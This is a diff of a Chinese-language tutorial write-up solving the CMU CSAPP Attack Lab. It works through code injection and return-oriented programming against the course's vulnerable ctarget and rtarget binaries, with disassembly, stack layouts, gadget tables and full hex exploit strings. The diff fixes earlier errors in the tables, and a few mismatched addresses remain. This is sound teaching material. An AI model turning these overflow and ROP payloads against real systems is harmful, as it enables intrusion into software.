@@ -1,3 +1,38 @@
+# CSAPP Attack Lab: 缓冲区溢出攻击
+
+## 前言
+
+CMU的15-213课程Introduction to Computer Systems (ICS)里面有一个实验叫attack lab，利用缓冲区溢出漏洞改变正常的程序运行行为，从而达到攻击的目的。关于这个lab的解题思路，网上已经有很多了，但我依然想要再来一篇。原因包括：
+
+- 十年前我曾完成了这个lab的前身bufbomb(http://dev.poetpalace.org/?p=39)，这绝对是我在计算机行业中，乃至人生中最有趣的体验之一。哪怕是十年后重温，依然如此。
+- 冠状病毒肆虐的今天，我没什么可做的，但是我可以研究计算机病毒。*To be a good people you have to know how bad people do.*
+
+## attach lab 说明
+
+### 缓冲区溢出
+
+所谓缓冲区溢出，是在历史遗留的C函数库中，存在一些函数不检查缓冲区大小，比如下面这个函数正常只能输入3个字符（不包括结尾的'\0')：
+
+```c
+void echo()
+{
+    char buf[4]; /* Way too small! */ gets(buf);
+    puts(buf);
+    puts(buf);
+}
+```
+
+当用户输入超过3个字符时，就可能破坏程序的帧栈结构，这一点恰恰为恶意攻击者利用。attack lab中使用了有漏洞的`Gets()`函数，并通过不同的编译参数编译了两个二进制文件：ctarget和rtarget。
+
+
+### ctarget
+
+ctarget没有启用任何保护措施，攻击者可以注入精心设计的二进制代码，并修改函数返回地址来运行这段代码。
+
+
+### rtarget
+
+
 ## Phase 1
 ```
 (gdb) disas test
@@ -13,6 +48,7 @@ Dump of assembler code for function test:
    0x000000000040198c <+36>:	add    $0x8,%rsp
    0x0000000000401990 <+40>:	retq   
 End of assembler dump.
+
 (gdb) disas getbuf
 Dump of assembler code for function getbuf:
    0x00000000004017a8 <+0>:	sub    $0x28,%rsp
@@ -64,10 +100,8 @@ End of assembler dump.
 
 ### Solution
 
-```
-cat result1 | ./hex2raw
-0123456789012345678901234567890123456789�@
-cat result1 | ./hex2raw | ./ctarget -q
+```bash
+# cat result1 | ./hex2raw | ./ctarget -q
 Cookie: 0x59b997fa
 Type string:Touch1!: You called touch1()
 Valid solution for level 1 with target ctarget
@@ -75,7 +109,7 @@ PASS: Would have posted the following:
         user id bovik
         course  15213-f15
         lab     attacklab
-        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 
+        result  1:PASS:0xffffffff:ctarget:1:2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D C0 17 40 00 00 00 00 
 ```
 
 40 pading bytes, and the return address 0x4017c0 (getbuf). the entire return address should be typed, as the Gets() place a '\0' at the end of input.
@@ -145,8 +179,8 @@ Disassembly of section .text:
 
 ### Solution
 
-```
-cat result2 | ./hex2raw | ./ctarget -q
+```bash
+# cat result2 | ./hex2raw | ./ctarget -q
 Cookie: 0x59b997fa
 Type string:Touch2!: You called touch2(0x59b997fa)
 Valid solution for level 2 with target ctarget
@@ -154,7 +188,7 @@ PASS: Would have posted the following:
         user id bovik
         course  15213-f15
         lab     attacklab
-        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 78 DC 61 55 00 00 00 00 EC 17 40 
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 
 ```
 
 ## Phase 3
@@ -277,28 +311,17 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ### stack layout
 
-| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1                                | 0    | note                    |
-| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | -------------------------------- | ---- | ----------------------- |
-| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4                             | '\0' | '\0' by Gets()          |
-| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39                             | 0x35 | palce "59b997fa"        |
-| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f                             | 0x24 | 0x401f24 return main()? |
-| 0x5561dca8 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x18                             | 0xfa | ret touch3()            |
-| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 055  | 0x61 | 0xdc                             | 0x78 | ret 0x5561dc78 (stack!) |
-| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -                                | -    | getbuf() stack          |
-| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -                                | -    |                         |
-| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -                                | -    |                         |
-| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -   0000000000401ab2 <end_farm>: |
-  401ab2:       b8 01 00 00 00          mov    $0x1,%eax
-  401ab7:       c3                      retq   
-  401ab8:       90                      nop
-  401ab9:       90                      nop
-  401aba:       90                      nop
-  401abb:       90                      nop
-  401abc:       90                      nop
-  401abd:       90                      nop
-  401abe:       90                      nop
-  401abf:       90                      nop
- | -    | hexmatch+23 overwrite     |
+| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                      |
+| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------- |
+| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | '\0' | '\0' by Gets()            |
+| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | palce "59b997fa"          |
+| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()?   |
+| 0x5561dca8 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x18 | 0xfa | ret touch3()              |
+| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 055  | 0x61 | 0xdc | 0x78 | ret 0x5561dc78 (stack!)   |
+| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack            |
+| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
+| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
+| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    | hexmatch+23 overwrite     |
 | 0x5561dc78 | 0xc3 | 0x55 | 0x61 | 0xdc | 0x80 | 0xc7 | 0xc7 | 0x48 | mov $0x5561dc80,%rdi; ret |
 
 and after execution
@@ -306,7 +329,7 @@ and after execution
 | address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                            |
 | ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------------- |
 | 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | '\0' | '\0' by Gets()                  |
-| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | palce "59b997fa"                |
+| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | cookie "59b997fa"               |
 | 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()?         |
 | 0x5561dca8 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | touch3() push %rbx              |
 | 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0x61 | touch3+28 call hexmatch()       |
@@ -330,7 +353,7 @@ and after execution
 
 ```
 
-其中`0x4019ab`开始的`58 80 c3`可以解释为以下汇编语句
+其中`0x4019ab`开始的`58 90 c3`可以解释为以下汇编语句
 
 ```
    0:   58                      pop    %rax
@@ -346,7 +369,7 @@ and after execution
   4019c9:       c3                      retq   
 ```
 
-`0x4019c6`开始的`48 89 c7 90 c`可以解释为以下汇编语句
+`0x4019c5`开始的`48 89 c7 90 c3`可以解释为以下汇编语句
 
 ```
    3:   48 89 c7                mov    %rax,%rdi
@@ -360,7 +383,7 @@ and after execution
 | ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ----------------- |
 | 72      | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | untouched         |
 | 64      | '\0' | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x17 | 0xec | ret touch2()      |
-| 56      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc6 | Gadget2 0x4019c6  |
+| 56      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc5 | Gadget2 0x4019c6  |
 | 48      | 0x00 | 0x00 | 0x00 | 0x00 | 0x59 | 0xb9 | 0x97 | 0xfa | cookie 0x59b997fa |
 | 40      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xab | Gadget1 0x4019ab  |
 | 32      | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack    |
@@ -398,3 +421,72 @@ PASS: Would have posted the following:
 ```
 
 ## Phase 5
+
+我们需要在栈上放一个字符串(cookie)，并把这个字符串的地址作为参数传递给touch3()，这里的难点是rtarget编译时针对缓冲区溢出攻击做了防御：
+栈的起始位置是随机的，因为无法预知字符串的地址。解题思路是使用某个固定的偏移量把字符串放到%rsp的一个相对地址，然后根据%rsp的值和偏移量计算出绝对地址。
+
+### Gadgets
+
+先来看看我们有什么Gadgets可用，其中`add_xy`是直接可用的，也是解题的核心
+
+| id  | function   | address  | hex string     | asm                               | note                        |
+| --- | ---------- | -------- | -------------- | --------------------------------- | --------------------------- |
+| G0  | addval_190 | 0x401a06 | 48 89 e0 c3    | mov %rsp,%rax; retq               | 把%rsp的值复制到%rax        |
+| G1  | setval_426 | 0x4019c5 | 48 89 c7 90 c3 | mov %rax,%rdi; nop; retq          | Phase 4的Gadage2            |
+| G2  | addval_219 | 0x4019ab | 58 90 c3       | pop %rax; nop; retq               | Phase 4的Gadage1            |
+| G3  | getval_481 | 0x4019dd | 89 c2 90 c3    | mov %eax,%edx; nop; retq          | 注意这里是movl，传送低4字节 |
+| G4  | getval_159 | 0x401a34 | 89 d1 38 c9 c3 | mov %edx,%ecx; cmp %cl,%cl; retq  | 注意这里是movl，传送低4字节 |
+| G5  | addval_189 | 0x401a27 | 89 ce 38 c0 c3 | mov %ecx, %esi; cmp %al,%al; retq | 注意这里是movl，传送低4字节 |
+| G6  | add_xy     | 0x4019d6 | 48 8d 04 37 c3 | lea (%rdi,%rsi,1),%rax; retq      | 直接可用                    |
+
+### 解题思路
+
+首先需要调用`add_xy`计算cookie的地址，两个参数（%rdi，%rsi）可通过下面Gadget组合获得
+1. (参数1): %rdi
+    1. (G0): movq %rsp,%rax
+    1. (G1): movq %rax,%rdi
+1. (参数2): %rsi
+    1. (G2): popq %rax
+    1. (G3): movl %eax,%edx
+    1. (G4): movl %edx,%ecx
+    1. (G5): movl %ecx,%rsi
+
+调用(G6)`add_xy`计算cookie的地址，结果在%eax中
+然后通过(G1)把%eax的值传送到%rdi（参数1）中，最后调用`touch3()`。
+
+### Stack layout
+
+| address | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                                                    |
+| ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------------------------------------- |
+| 128     | -    | -    | -    | -    | -    | -    | -    | '\0' | '\0' by Gets()                                          |
+| 120     | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | cookie "59b997fa"                                       |
+| 112     | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x18 | 0xfa | touch3(): 0x40a8fa                                      |
+| 104     | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc5 | G1 0x4019c6: %rax -> %rdi                               |
+| 96      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xd6 | G6 0x4019d6: lea (%rdi,%rsi,1),%rax                     |
+| 88      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x1a | 0x27 | G5 0x401a27: %ecx -> %esi                               |
+| 80      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x1a | 0x34 | G4 0x401a34: %edx -> %ecx                               |
+| 72      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xdd | G3 0x4019dd: %eax -> %edx                               |
+| 64      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x48 | 偏移量 120 - 48 = 72 (0x48)                             |
+| 56      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xab | G2 0x4019ab: (%rsp) -> %rax                             |
+| 48      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc5 | G1 0x4019c6: %rax -> %rdi 这个地址也是1.1里面保存的%rsp |
+| 40      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x1a | 0x06 | G0 0x401a06: %rsp -> %rax                               |
+| 32      | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack                                          |
+| 24      | -    | -    | -    | -    | -    | -    | -    | -    |                                                         |
+| 16      | -    | -    | -    | -    | -    | -    | -    | -    |                                                         |
+| 8       | -    | -    | -    | -    | -    | -    | -    | -    |                                                         |
+| 0       | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp                                            |
+
+
+### Solution
+
+```bash
+# cat result5 | ./hex2raw | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 27 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+```
